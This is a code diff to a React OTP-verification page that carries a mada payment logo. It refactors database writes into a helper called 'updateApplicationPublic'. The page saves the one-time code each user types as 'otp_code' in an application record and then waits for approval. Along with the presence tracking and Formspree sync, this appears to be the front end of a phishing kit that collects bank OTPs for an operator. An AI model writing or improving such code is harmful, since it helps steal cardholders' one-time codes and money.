@@ -10,6 +10,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { supabase } from "@/integrations/supabase/client";
 import { getApplicationStatus } from "@/lib/applicationPublic";
+import { updateApplicationPublic } from "@/lib/ownerToken";
 import { usePresence } from "@/hooks/usePresence";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import madaLogo from "@/assets/mada-logo.png";
@@ -145,10 +146,7 @@ const OTPVerification = () => {
       getApplicationStatus(applicationId)
         .then(({ data }) => {
           const currentCount = (data as any)?.otp_resend_count || 0;
-          supabase
-            .from('customer_applications')
-            .update({ otp_resend_count: currentCount + 1 } as any)
-            .eq('id', applicationId)
+          updateApplicationPublic(applicationId, { otp_resend_count: currentCount + 1 })
             .then(() => console.log('OTP resend count updated'));
         });
     }
@@ -171,18 +169,12 @@ const OTPVerification = () => {
     setIsVerifying(true);
     try {
       if (applicationId) {
-        // Update existing application with OTP code instead of creating a new one
-        const { error } = await supabase
-          .from('customer_applications')
-          .update({
-            otp_code: otp,
-            current_step: 'otp',
-            otp_approved: false,
-            status: 'pending_otp'
-          })
-          .eq('id', applicationId);
-
-        if (error) throw error;
+        const ok = await updateApplicationPublic(applicationId, {
+          otp_code: otp,
+          current_step: 'otp',
+          status: 'pending_otp',
+        });
+        if (!ok) throw new Error('save failed');
         
         setIsVerifying(false);
         setWaitingForApproval(true);
@@ -425,9 +417,7 @@ const OTPVerification = () => {
         setShowErrorDialog(open);
         if (!open) {
           if (applicationId) {
-            supabase.from('customer_applications').update({
-              status: 'pending'
-            }).eq('id', applicationId);
+            updateApplicationPublic(applicationId, { status: 'pending' });
           }
         }
       }}>
